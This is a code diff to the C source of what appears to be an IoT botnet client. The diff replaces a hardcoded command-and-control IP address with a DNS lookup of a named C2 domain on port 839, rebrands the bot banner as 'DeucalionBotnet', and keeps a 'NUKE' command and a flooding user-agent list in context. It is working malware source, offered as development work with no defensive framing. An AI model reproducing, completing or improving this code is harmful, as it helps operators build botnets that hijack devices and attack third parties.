@@ -19,7 +19,6 @@
 #include <sys/wait.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
-#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
 #define PAD_RIGHT 1
 #define PAD_ZERO 2
 #define PRINT_BUF_LEN 12
@@ -30,7 +29,6 @@
 //
 //
 //
-unsigned char *commServer[] = {"185.132.53.11:839"};
 
 const char *useragents[] = {
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
@@ -1693,25 +1691,64 @@ if(!strcmp(argv[0], "NUKE"))
 
 int initConnection()
 {
-        unsigned char server[512];
-        memset(server, 0, 512);
-        if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
-        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
-        else currentServer++;
+    const char *domain = "shit.d3vsoft.com";
+    struct addrinfo hints, *res, *p;
+    struct sockaddr_in *ipv4;
+    char ipstr[INET_ADDRSTRLEN];
 
-        strcpy(server, commServer[currentServer]);
-        int port = 6982;
-        if(strchr(server, ':') != NULL)
-        {
-                port = atoi(strchr(server, ':') + 1);
-                *((unsigned char *)(strchr(server, ':'))) = 0x0;
-        }
+    // Инициализиране на hints
+    memset(&hints, 0, sizeof hints);
+    hints.ai_family = AF_INET; // IPv4
+    hints.ai_socktype = SOCK_STREAM;
 
-        mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
+    // Извличане на IP адреса
+    int status = getaddrinfo(domain, NULL, &hints, &res);
+    if (status != 0) {
+        fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(status));
+        return 1;
+    }
 
-        if(!connectTimeout(mainCommSock, server, port, 30)) return 1;
+    // Вземаме първия IP адрес от резултатите
+    p = res;
+    if (p == NULL) {
+        fprintf(stderr, "No IP address found for %s\n", domain);
+        freeaddrinfo(res);
+        return 1;
+    }
 
-        return 0;
+    ipv4 = (struct sockaddr_in *)p->ai_addr;
+    inet_ntop(p->ai_family, &(ipv4->sin_addr), ipstr, sizeof ipstr);
+
+    // Освобождаваме паметта за addrinfo, защото вече не ни трябва
+    freeaddrinfo(res);
+
+    // Създаваме сокет
+    if (mainCommSock) {
+        close(mainCommSock);
+        mainCommSock = 0;
+    }
+
+    mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
+    if (mainCommSock == -1) {
+        perror("Socket creation failed");
+        return 1;
+    }
+
+    // Подготовка за свързване със сървъра
+    struct sockaddr_in server_addr;
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(839); // Портът, който използвате (839)
+    inet_pton(AF_INET, ipstr, &server_addr.sin_addr);
+
+    // Свързване със сървъра с timeout
+    if (!connectTimeout(mainCommSock, ipstr, 839, 30)) {
+        close(mainCommSock);
+        mainCommSock = 0;
+        return 1;
+    }
+
+    return 0;
 }
 
 int main(int argc, unsigned char *argv[])
@@ -1743,7 +1780,7 @@ int main(int argc, unsigned char *argv[])
         while(1)
         {
                 if(initConnection()) { sleep(5); continue; }
-                sockprintf(mainCommSock, "\e[0m[\e[1;31mDreamSec.\e[0m][\e[1;31m%s\e[0m]\e[1;31m:\e[0m[\e[1;31m%s\e[0m] \e[1;31m>\e[0m [\e[1;31m%s\e[0m]", inet_ntoa(ourIP), getPortz(), getArch());
+                sockprintf(mainCommSock, "\e[0m[\e[1;31mDeucalionBotnet.\e[0m][\e[1;31m%s\e[0m]\e[1;31m:\e[0m[\e[1;31m%s\e[0m] \e[1;31m>\e[0m [\e[1;31m%s\e[0m]", inet_ntoa(ourIP), getPortz(), getArch());
                 char commBuf[4096];
                 int got = 0;
                 int i = 0;
